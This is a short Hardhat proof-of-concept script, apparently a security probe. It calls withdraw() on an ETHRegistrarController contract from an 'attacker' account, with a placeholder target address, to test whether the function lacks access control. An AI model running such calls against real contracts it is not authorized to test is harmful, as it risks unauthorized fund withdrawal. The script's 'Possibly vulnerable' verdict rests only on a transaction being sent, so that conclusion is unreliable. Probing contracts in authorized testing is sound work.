// scripts/poc-withdraw.js
const hre = require("hardhat");

async function main() {
  const [attacker] = await hre.ethers.getSigners();

  const controller = await hre.ethers.getContractAt(
    "ETHRegistrarController",
    "0xYourTargetContractAddress" // replace with real address if needed
  );

  const tx = await controller.connect(attacker).withdraw();
  console.log("✅ Possibly vulnerable. TX:", tx.hash);
}

main().catch((error) => {
  console.error("❌ Exploit failed:", error);
});
